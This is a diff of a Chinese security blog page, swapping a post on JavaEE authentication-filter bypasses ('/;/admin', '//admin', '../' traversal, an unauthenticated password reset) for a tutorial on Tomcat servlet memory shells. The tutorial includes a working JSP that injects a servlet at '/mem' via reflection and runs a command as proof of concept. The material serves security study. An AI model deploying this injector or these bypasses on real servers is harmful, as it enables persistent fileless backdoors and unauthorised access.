@@ -14,15 +14,15 @@
   <meta name="theme-color">
 
   
-  <title>JavaEE代码审计-鉴权逻辑 &middot; IIIIIII的博客</title>
-    <meta name="title" content="JavaEE代码审计-鉴权逻辑 &middot; IIIIIII的博客">
+  <title>JAVA-内存马 &middot; IIIIIII的博客</title>
+    <meta name="title" content="JAVA-内存马 &middot; IIIIIII的博客">
 
   
   
-  <meta name="keywords" content="JavaEE,">
+  <meta name="keywords" content="java,">
   
   
-  <link rel="canonical" href="https://Starrui777.github.io/posts/code3javaee/">
+  <link rel="canonical" href="https://Starrui777.github.io/posts/memory/">
   
   
   
@@ -95,45 +95,45 @@
   
 
   
-  <meta property="og:url" content="https://Starrui777.github.io/posts/code3javaee/">
+  <meta property="og:url" content="https://Starrui777.github.io/posts/memory/">
   <meta property="og:site_name" content="IIIIIII的博客">
-  <meta property="og:title" content="JavaEE代码审计-鉴权逻辑">
+  <meta property="og:title" content="JAVA-内存马">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-10-29T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-10-29T00:00:00+00:00">
-    <meta property="article:tag" content="JavaEE">
+    <meta property="article:published_time" content="2025-11-04T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-11-04T00:00:00+00:00">
+    <meta property="article:tag" content="Java">
 
   
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="JavaEE代码审计-鉴权逻辑">
+  <meta name="twitter:title" content="JAVA-内存马">
 
   <script type="application/ld+json">
   [{
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Posts",
-    "name": "JavaEE代码审计-鉴权逻辑",
-    "headline": "JavaEE代码审计-鉴权逻辑",
+    "name": "JAVA-内存马",
+    "headline": "JAVA-内存马",
     
     
     "inLanguage": "en",
-    "url" : "https:\/\/Starrui777.github.io\/posts\/code3javaee\/",
+    "url" : "https:\/\/Starrui777.github.io\/posts\/memory\/",
     "author" : {
       "@type": "Person",
       "name": "IIIIIIIIIIII"
     },
     "copyrightYear": "2025",
-    "dateCreated": "2025-10-29T00:00:00\u002b00:00",
-    "datePublished": "2025-10-29T00:00:00\u002b00:00",
+    "dateCreated": "2025-11-04T00:00:00\u002b00:00",
+    "datePublished": "2025-11-04T00:00:00\u002b00:00",
     
-    "dateModified": "2025-10-29T00:00:00\u002b00:00",
+    "dateModified": "2025-11-04T00:00:00\u002b00:00",
     
-    "keywords": ["JavaEE"],
+    "keywords": ["java"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "393"
+    "wordCount": "254"
   }]
   </script>
 
@@ -509,7 +509,7 @@
     <header id="single_header" class="mt-5 max-w-prose">
       
       <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-        JavaEE代码审计-鉴权逻辑
+        JAVA-内存马
       </h1>
       <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
         
@@ -562,7 +562,7 @@
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2025-10-29T00:00:00&#43;00:00">29 October 2025</time><span class="px-2 text-primary-500">&middot;</span><span>393 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span>
+      <time datetime="2025-11-04T00:00:00&#43;00:00">4 November 2025</time><span class="px-2 text-primary-500">&middot;</span><span>254 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span>
     
 
     
@@ -586,11 +586,11 @@
         
           
             
-              <a class="relative mt-[0.5rem] mr-2" href="/tags/javaee/"
+              <a class="relative mt-[0.5rem] mr-2" href="/tags/java/"
                 ><span class="flex cursor-pointer">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    JavaEE
+    Java
   </span>
 </span>
 </a
@@ -740,12 +740,14 @@
     class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#javaee代码审计-鉴权逻辑">JavaEE代码审计-鉴权逻辑</a>
+    <li><a href="#java-内存马-servlet">JAVA-内存马-servlet</a>
       <ul>
-        <li><a href="#案例一newbee-mall-">案例一：newbee-mall-</a></li>
-        <li><a href="#案例二medicine-mangement系统">案例二：medicine-mangement系统</a></li>
-        <li><a href="#案例三华夏erp-过滤器">案例三：华夏ERP-过滤器</a></li>
-        <li><a href="#案例四天猫-过滤器">案例四：天猫-过滤器</a></li>
+        <li><a href="#1servlet内存马">1：servlet内存马</a>
+          <ul>
+            <li><a href="#tomcat是如何加载这些servlet的呢">tomcat是如何加载这些servlet的呢</a></li>
+            <li><a href="#编写jsp">编写JSP</a></li>
+          </ul>
+        </li>
       </ul>
     </li>
   </ul>
@@ -761,12 +763,14 @@
     class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#javaee代码审计-鉴权逻辑">JavaEE代码审计-鉴权逻辑</a>
+    <li><a href="#java-内存马-servlet">JAVA-内存马-servlet</a>
       <ul>
-        <li><a href="#案例一newbee-mall-">案例一：newbee-mall-</a></li>
-        <li><a href="#案例二medicine-mangement系统">案例二：medicine-mangement系统</a></li>
-        <li><a href="#案例三华夏erp-过滤器">案例三：华夏ERP-过滤器</a></li>
-        <li><a href="#案例四天猫-过滤器">案例四：天猫-过滤器</a></li>
+        <li><a href="#1servlet内存马">1：servlet内存马</a>
+          <ul>
+            <li><a href="#tomcat是如何加载这些servlet的呢">tomcat是如何加载这些servlet的呢</a></li>
+            <li><a href="#编写jsp">编写JSP</a></li>
+          </ul>
+        </li>
       </ul>
     </li>
   </ul>
@@ -788,79 +792,28 @@
 
         <div class="article-content max-w-prose mb-20">
           
-<h2 class="relative group">JavaEE代码审计-鉴权逻辑 
-    <div id="javaee代码审计-鉴权逻辑" class="anchor"></div>
+<h2 class="relative group">JAVA-内存马-servlet 
+    <div id="java-内存马-servlet" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#javaee%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1-%e9%89%b4%e6%9d%83%e9%80%bb%e8%be%91" aria-label="Anchor">#</a>
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#java-%e5%86%85%e5%ad%98%e9%a9%ac-servlet" aria-label="Anchor">#</a>
     </span>        
     
 </h2>
 <!-- more --> 
-<pre tabindex="0"><code>拦截器
-	Interceptor是一种拦截器，也称之为拦截器链（Interceptor Chain），主要用于拦截请求、响应或处理过程中的某些事件，比如权限认证、日志记录、性能测试等。在 Java 中，Interceptor可以用来扩展框架，增加或修改某个方法的行为，或者对应用流程做些前置处理、后置处理、环绕处理等。
 
-过滤器
-	Filter被称为过滤器，过滤器实际上就是对Web资源进行拦截，做一些处理后再交给下一个过滤器或Servlet处理，通常都是用来拦截request进行处理的，也可以对返回的 response进行拦截处理。开发人员利用filter技术，可以实现对所有Web资源的管理，例如实现权限访问控制、过滤敏感词汇、压缩响应信息等一些高级功能。
-不是在代码中 
-他这是网站启动就开始了
-
-好处：
-	减少代码重复性：
-	全局统一处理：
-	提前拦截，提升性能：
-				拦截器在请求到达业务代码（如 Controller、Service）之前就拦截非法请求（如未登录、参数格式错误），避免无效的业务处理，减少服务器资源消耗。
-				
-	
-	推荐两个进行互补
-	    通常建议 **“拦截器做全局通用校验，代码做业务专属校验”**，优势互补：
-</code></pre>
-<h3 class="relative group">案例一：newbee-mall- 
-    <div id="案例一newbee-mall-" class="anchor"></div>
+<h3 class="relative group">1：servlet内存马 
+    <div id="1servlet内存马" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%a1%88%e4%be%8b%e4%b8%80newbee-mall-" aria-label="Anchor">#</a>
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#1servlet%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="Anchor">#</a>
     </span>        
     
 </h3>
-<p>可以发现源码中这种过滤器的代码而且写了是admin字段的过滤</p>
-<pre tabindex="0"><code>preHandle是固定的写法和dofilter一样不是自己定义的 优先查看代码
-@Override
-    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object o) throws Exception {
-        String uri = request.getRequestURI();
-        if (uri.startsWith(&#34;/admin&#34;) &amp;&amp; null == request.getSession().getAttribute(&#34;loginUser&#34;)) {
-            request.getSession().setAttribute(&#34;errorMsg&#34;, &#34;请登陆&#34;);
-            response.sendRedirect(request.getContextPath() + &#34;/admin/login&#34;);
-            return false;
-        } else {
-            request.getSession().removeAttribute(&#34;errorMsg&#34;);
-            return true;
-        }
-    }
-    
-    
-</code></pre><p>
-
-
-
-
-
-
-<figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/javaee3/1.png">
-
-  
-</figure>
-</p>
-<ul>
-<li><code>preHandle</code>：请求处理<strong>之前</strong>执行（如登录校验、权限判断）；</li>
-<li><code>postHandle</code>：请求处理<strong>之后、视图渲染之前</strong>执行（如修改模型数据、添加全局参数）；</li>
-<li><code>afterCompletion</code>：整个请求完成后执行（如资源清理、日志记录）。</li>
-</ul>
-<p>绕过方法</p>
-<p><code>/;/admin或//admin</code></p>
+<p>Servlet 内存马是通过动态注册 Servlet 来实现的一种内存攻击手段。在 Java Web 应用中，Servlet 作为处理客户端请求的核心组件之一，能够直接处理 HTTP 请求并返回响应。攻击者利用这一点，通过程序化地向 Web 容器（如 Tomcat）在运行时注册恶意的 Servlet 对象，使得该 Servlet 能够在没有实际文件存在的情况下执行恶意程序。</p>
+<p>但是我们也要搞清除，Servlet类是怎么装载到Web容器里面的</p>
 <p>
 
 
@@ -869,169 +822,45 @@
 
 
 <figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/javaee3/2.png">
+    <img class="my-0 rounded-md" loading="lazy" alt="nmap" src="../images/mem/1.png">
 
   
 </figure>
 </p>
-<p>//admin 匹配就为空了就饶过了逻辑 但是又正常解析admin界面</p>
-<p>/;/admin 分号 <code>;</code> 在 URI 中是 “路径参数分隔符”（RFC 规范），服务器会忽略分号及后续内容（或仅作为参数处理），因此 <code>/;/admin</code> 会被规范化为 <code>/admin</code>，实际访问的是 <code>/admin</code> 资源</p>
+<p>自己编写一个类 重写doget方法</p>
+<pre tabindex="0"><code>package com.yr.memshellser;
 
-<h3 class="relative group">案例二：medicine-mangement系统 
-    <div id="案例二medicine-mangement系统" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%a1%88%e4%be%8b%e4%ba%8cmedicine-mangement%e7%b3%bb%e7%bb%9f" aria-label="Anchor">#</a>
-    </span>        
-    
-</h3>
-<p>yiyaoguanlixitong/admin/dist/index.html#/login</p>
-<p>代码说明了</p>
-<pre tabindex="0"><code class="language-e" data-lang="e">有这三个开头则放行
-/dictionary/page
-/file/upload
-/yonghu/register
-IgnoreAuth 带有这个的直接放行 比如  访问Login不需要鉴权
-   @IgnoreAuth
-    @RequestMapping(value = &#34;/login&#34;)
-    public R login(String username, String password, String captcha, HttpServletRequest request) {
-        YuangongEntity yuangong = yuangongService.selectOne(new EntityWrapper&lt;YuangongEntity&gt;().eq(&#34;username&#34;, username));
-        if(yuangong==null || !yuangong.getPassword().equals(password))
-            return R.error(&#34;账号或密码不正确&#34;);
-</code></pre><pre tabindex="0"><code>@Override
+import javax.servlet.Servlet;
+import javax.servlet.ServletException;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.IOException;
 
-   public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
+public class MyServlet extends HttpServlet {
 
-
-       String servletPath = request.getServletPath();
-       if(&#34;/dictionary/page&#34;.equals(request.getServletPath())  || &#34;/file/upload&#34;.equals(request.getServletPath()) || &#34;/yonghu/register&#34;.equals(request.getServletPath()) ){//请求路径是字典表或者文件上传 直接放行
-           return true;
-       }
-       //支持跨域请求
-    response.setHeader(&#34;Access-Control-Allow-Methods&#34;, &#34;POST, GET, OPTIONS, DELETE&#34;);
-       response.setHeader(&#34;Access-Control-Max-Age&#34;, &#34;3600&#34;);
-       response.setHeader(&#34;Access-Control-Allow-Credentials&#34;, &#34;true&#34;);
-       response.setHeader(&#34;Access-Control-Allow-Headers&#34;, &#34;x-requested-with,request-source,Token, Origin,imgType, Content-Type, cache-control,postman-token,Cookie, Accept,authorization&#34;);
-       response.setHeader(&#34;Access-Control-Allow-Origin&#34;, request.getHeader(&#34;Origin&#34;));
-
-       IgnoreAuth annotation;
-       if (handler instanceof HandlerMethod) {
-           annotation = ((HandlerMethod) handler).getMethodAnnotation(IgnoreAuth.class);
-       } else {
-           return true;
-       }
-
-       //从header中获取token
-       String token = request.getHeader(LOGIN_TOKEN_KEY);
-       
-       /**
-        * 不需要验证权限的方法直接放过
-        */
-       if(annotation!=null) {
-        return true;
-       }
-       
-</code></pre><p>http://192.168.56.1:8080/yiyaoguanlixitong/file/upload/../../admin/dist/index.html</p>
-<p>比如我们找到了一个users下面的resetpass  因为它是带IgnoreAuth的 而且直接GET传入username直接越权</p>
-<pre tabindex="0"><code>IgnoreAuth
-@RequestMapping(value = &#34;/resetPass&#34;)
-   public R resetPass(String username, HttpServletRequest request){
-    UsersEntity user = usersService.selectOne(new EntityWrapper&lt;UsersEntity&gt;().eq(&#34;username&#34;, username));
-    if(user==null) {
-       return R.error(&#34;账号不存在&#34;);
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        resp.getWriter().println(&#34;Hello World&#34;);
     }
-    user.setPassword(&#34;123456&#34;);
-       usersService.update(user,null);
-       return R.ok(&#34;密码已重置为：123456&#34;);
-   }
-</code></pre><p>
-
-
-
-
-
-
-<figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/javaee3/3.png">
-
-  
-</figure>
-</p>
-<p>
-
-
-
-
-
-
-<figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/javaee3/4.png">
-
-  
-</figure>
-</p>
-
-<h3 class="relative group">案例三：华夏ERP-过滤器 
-    <div id="案例三华夏erp-过滤器" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%a1%88%e4%be%8b%e4%b8%89%e5%8d%8e%e5%a4%8ferp-%e8%bf%87%e6%bb%a4%e5%99%a8" aria-label="Anchor">#</a>
-    </span>        
-    
-</h3>
-<p>init是初始化不用看主要看DOFILTER</p>
-<p>requestUrl != null &amp;&amp; (requestUrl.contains(&quot;/login.html&quot;) || requestUrl.contains(&quot;/register.html</p>
-<p>看这个如果有register.html就可以了那么我们直接构造跳过就行了</p>
-<pre tabindex="0"><code>@Override
-public void doFilter(ServletRequest request, ServletResponse response,
-                     FilterChain chain) throws IOException, ServletException {
-    HttpServletRequest servletRequest = (HttpServletRequest) request;
-    HttpServletResponse servletResponse = (HttpServletResponse) response;
-    String requestUrl = servletRequest.getRequestURI();
-    //具体，比如：处理若用户未登录，则跳转到登录页
-    Object userInfo = servletRequest.getSession().getAttribute(&#34;user&#34;);
-    if(userInfo!=null) { //如果已登录，不阻止
-        chain.doFilter(request, response);
-        return;
-    }
-    if (requestUrl != null &amp;&amp; (requestUrl.contains(&#34;/login.html&#34;) || requestUrl.contains(&#34;/register.html&#34;))) {
-        chain.doFilter(request, response);
-        return;
-    }
-    if (verify(ignoredList, requestUrl)) {
-        chain.doFilter(servletRequest, response);
-        return;
-    }
-    if (null != allowUrls &amp;&amp; allowUrls.length &gt; 0) {
-        for (String url : allowUrls) {
-            if (requestUrl.startsWith(url)) {
-                chain.doFilter(request, response);
-                return;
-</code></pre><p>/account/getAccount</p>
-<p>浏览器不行换BP可以</p>
-<p>
-
-
-
-
-
-
-<figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/javaee3/5.png">
-
-  
-</figure>
-</p>
-<p>同时他还判断请求JS CSS可以</p>
-<pre tabindex="0"><code> initParams = {@WebInitParam(name = &#34;ignoredUrl&#34;, value = &#34;.css#.js#.jpg#.png#.gif#.ico&#34;),
-                      @WebInitParam(name = &#34;filterPath&#34;,
-if (verify(ignoredList, requestUrl)) {
-    chain.doFilter(servletRequest, response);
-    return;
 }
-</code></pre><p>
+</code></pre><p>再web.xml下面定义路径是my</p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;web-app xmlns=&#34;http://xmlns.jcp.org/xml/ns/javaee&#34;
+         xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;
+         xsi:schemaLocation=&#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&#34;
+         version=&#34;4.0&#34;&gt;
+    &lt;servlet&gt;
+        &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;
+        &lt;servlet-class&gt;com.yr.memshellser.MyServlet&lt;/servlet-class&gt;
+    &lt;/servlet&gt;
+    &lt;servlet-mapping&gt;
+        &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;
+        &lt;url-pattern&gt;/my&lt;/url-pattern&gt;
+    &lt;/servlet-mapping&gt;
+&lt;/web-app&gt;
+</code></pre><p>然后访问路径触发URL</p>
+<p>
 
 
 
@@ -1039,42 +868,41 @@ if (verify(ignoredList, requestUrl)) {
 
 
 <figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/javaee3/6.png">
+    <img class="my-0 rounded-md" loading="lazy" alt="nmap" src="../images/mem/2.png">
 
   
 </figure>
 </p>
+<pre><code>两种生效方法：一种定义xml 一种@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-servlet&quot;) 这种
+								    &lt;servlet&gt;
+								        &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;
+								        &lt;servlet-class&gt;com.yr.memshellser.MyServlet&lt;/servlet-class&gt;
+								    &lt;/servlet&gt;
+								    &lt;servlet-mapping&gt;
+								        &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;
+								        &lt;url-pattern&gt;/My&lt;/url-pattern&gt;
+								    &lt;/servlet-mapping&gt;
+</code></pre>
 
-<h3 class="relative group">案例四：天猫-过滤器 
-    <div id="案例四天猫-过滤器" class="anchor"></div>
+<h4 class="relative group">tomcat是如何加载这些servlet的呢 
+    <div id="tomcat是如何加载这些servlet的呢" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%a1%88%e4%be%8b%e5%9b%9b%e5%a4%a9%e7%8c%ab-%e8%bf%87%e6%bb%a4%e5%99%a8" aria-label="Anchor">#</a>
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#tomcat%e6%98%af%e5%a6%82%e4%bd%95%e5%8a%a0%e8%bd%bd%e8%bf%99%e4%ba%9bservlet%e7%9a%84%e5%91%a2" aria-label="Anchor">#</a>
     </span>        
     
-</h3>
-<p>直接../../绕过就行了</p>
-<pre tabindex="0"><code>@Override
-public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
-    HttpServletRequest servletRequest = (HttpServletRequest) request;
-    //如果是(登录界面,登录态失效界面)，直接放行
-    if(servletRequest.getRequestURI().contains(&#34;/admin/login&#34;) ||
-            servletRequest.getRequestURI().contains(&#34;/admin/account&#34;)
-    ){
-        chain.doFilter(request, response);
-    } else {
-        logger.info(&#34;检查管理员权限&#34;);
-        Object o = servletRequest.getSession().getAttribute(&#34;adminId&#34;);
-        if(o == null){
-            logger.info(&#34;无管理权限，返回管理员登陆页&#34;);
-            request.getRequestDispatcher(&#34;/admin/login&#34;).forward(request, response);
-        } else {
-            logger.info(&#34;权限验证成功，管理员ID：{}&#34;,o);
-            chain.doFilter(request, response);
-        }
-    }
-</code></pre><p>
+</h4>
+<p>​	加载tomcat源码</p>
+<p>compile不行就用provided</p>
+<pre tabindex="0"><code>&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;
+    &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;
+    &lt;version&gt;9.0.74&lt;/version&gt;
+    &lt;scope&gt;compile&lt;/scope&gt; &lt;!-- 或 provided，根据场景调整 --&gt;
+&lt;/dependency&gt;
+</code></pre><p>​	这里的代码类就是加载sevlet进去容器的代码我们可以断点看下</p>
+<p>
 
 
 
@@ -1082,7 +910,183 @@ public void doFilter(ServletRequest request, ServletResponse response, FilterCha
 
 
 <figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/javaee3/7.png">
+    <img class="my-0 rounded-md" loading="lazy" alt="nmap" src="../images/mem/3.png">
+
+  
+</figure>
+</p>
+<p>成功断下来</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="nmap" src="../images/mem/4.png">
+
+  
+</figure>
+</p>
+<p>在下面发现了MAP里面就是我们的对象</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="nmap" src="../images/mem/5.png">
+
+  
+</figure>
+</p>
+<p>同时还有映射关系/My 映射到MyServlet .jsp映射到jsp</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="nmap" src="../images/mem/6.png">
+
+  
+</figure>
+</p>
+<p>我们所以的Servlet变成了webxml传入进去了configureContext方法中进行处理</p>
+<p>这里的for循环就是添加的地方</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="nmap" src="../images/mem/7.png">
+
+  
+</figure>
+</p>
+<p>把servlet放到 wrapper里面然后把，wrapper放到了context中，就完成添加servlet到tomcat中的过程</p>
+<p>如下面代码添加mapping</p>
+<pre tabindex="0"><code>for (Entry&lt;String, String&gt; entry :
+        webxml.getServletMappings().entrySet()) {
+    context.addServletMappingDecoded(entry.getKey(), entry.getValue());
+}
+</code></pre><p>所以这两个代码完成了servlet和mapping的添加</p>
+<pre tabindex="0"><code>context.addChild(wrapper);
+}
+for (Entry&lt;String, String&gt; entry :
+        webxml.getServletMappings().entrySet()) {
+    context.addServletMappingDecoded(entry.getKey(), entry.getValue());
+}
+</code></pre><p>所以让目标执行这里两个代码就行了对吧。</p>
+<p><code>但是context是什么呢</code></p>
+<p>在doGet的地方断点</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="nmap" src="../images/mem/8.png">
+
+  
+</figure>
+</p>
+<p>输入方法</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="nmap" src="../images/mem/9.png">
+
+  
+</figure>
+</p>
+<p>在这里发现了我们要的那个context 所以我们拿到那个Standard context就可以执行上面两步了</p>
+
+<h4 class="relative group">编写JSP 
+    <div id="编写jsp" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e7%bc%96%e5%86%99jsp" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>JSP（Java Server Page）是 Servlet 的<strong>动态扩展形式</strong>——Web 容器（如 Tomcat）会将 JSP 文件<strong>编译成 Servlet 类</strong>（<code>.class</code>文件），并在内存中加载执行。例如，一个<code>test.jsp</code>文件在编译后会生成对应的<code>test_jsp.java</code>和<code>test_jsp.class</code>，其本质就是一个 Servlet。</p>
+<pre tabindex="0"><code>&lt;%@ page import=&#34;java.io.IOException&#34; %&gt;
+&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt;
+&lt;%@ page import=&#34;org.apache.catalina.core.ApplicationContext&#34; %&gt;
+&lt;%@ page import=&#34;org.apache.catalina.core.StandardContext&#34; %&gt;
+&lt;%@ page import=&#34;org.apache.catalina.Wrapper&#34; %&gt;
+&lt;%@ page contentType=&#34;text/html;charset=UTF-8&#34; language=&#34;java&#34; %&gt;
+&lt;%!
+    //定义恶意的servlet
+public  class Memshell extends HttpServlet{
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        Runtime.getRuntime().exec(&#34;calc&#34;);
+    }
+}
+%&gt;
+
+&lt;%
+    ServletContext servletContext = request.getServletContext();
+    //拿到applicationContext
+    Field context = servletContext.getClass().getDeclaredField(&#34;context&#34;);
+    context.setAccessible(true);
+    //获取指定对象中当前字段的值。获取servletContext中的context就是我们的ApplicationContext对象
+    ApplicationContext applicationContext = (ApplicationContext) context.get(servletContext);
+
+    Field context1 = applicationContext.getClass().getDeclaredField(&#34;context&#34;);
+    context1.setAccessible(true);
+    StandardContext standardContext = (StandardContext)context1.get(applicationContext);
+    //将Memshell封装到wrapper中
+    Wrapper wrapper = standardContext.createWrapper();
+    wrapper.setName(&#34;memshell&#34;);
+    wrapper.setServletClass(Memshell.class.getName());
+    wrapper.setServlet(new Memshell());
+    //添加wapper到context中然后映射
+    standardContext.addChild(wrapper);
+    standardContext.addServletMappingDecoded(&#34;/mem&#34;,&#34;memshell&#34;);
+%&gt;
+</code></pre><p>现在我们不能访问mem</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="nmap" src="../images/mem/10.png">
+
+  
+</figure>
+</p>
+<p>然后我们触发jsp后成功弹出计算器</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="nmap" src="../images/mem/11.png">
 
   
 </figure>
@@ -1175,6 +1179,129 @@ public void doFilter(ServletRequest request, ServletResponse response, FilterCha
     
     
       <time datetime="2025-10-29T00:00:00&#43;00:00">29 October 2025</time><span class="px-2 text-primary-500">&middot;</span><span>1894 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">9 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+        
+      
+        
+      
+        
+          
+            
+              <a class="relative mt-[0.5rem] mr-2" href="/tags/javaee/"
+                ><span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    JavaEE
+  </span>
+</span>
+</a
+              >
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+    </div>
+    
+  </div>
+  <div class="px-6 pt-4 pb-2"></div>
+</div>
+
+      
+        
+<div
+  class="group-hover-card group relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
+  <a
+    
+  href="/posts/code3javaee/"
+    class="absolute inset-0"
+    aria-label="JavaEE代码审计-鉴权逻辑"></a>
+      
+    
+        
+          <div
+            class="thumbnail_card_related nozoom w-full"
+            style="background-image:url(/image/background.svg);"></div>
+        
+      
+  <div class="px-6 py-4">
+    
+      <div
+        class="group-hover-card-title decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 group-hover:underline group-hover:underline-offset-2">
+        JavaEE代码审计-鉴权逻辑
+      </div>
+    
+    <div class="group-hover-cancel text-sm text-neutral-500 dark:text-neutral-400">
+      
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2025-10-29T00:00:00&#43;00:00">29 October 2025</time><span class="px-2 text-primary-500">&middot;</span><span>393 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span>
     
 
     
@@ -1595,129 +1722,6 @@ public void doFilter(ServletRequest request, ServletResponse response, FilterCha
 </div>
 
       
-        
-<div
-  class="group-hover-card group relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
-  <a
-    
-  href="/posts/code13phpmvc/"
-    class="absolute inset-0"
-    aria-label="PHP11-Laravel-代码审计"></a>
-      
-    
-        
-          <div
-            class="thumbnail_card_related nozoom w-full"
-            style="background-image:url(/image/background.svg);"></div>
-        
-      
-  <div class="px-6 py-4">
-    
-      <div
-        class="group-hover-card-title decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 group-hover:underline group-hover:underline-offset-2">
-        PHP11-Laravel-代码审计
-      </div>
-    
-    <div class="group-hover-cancel text-sm text-neutral-500 dark:text-neutral-400">
-      
-
-
-
-
-
-
-
-  
-
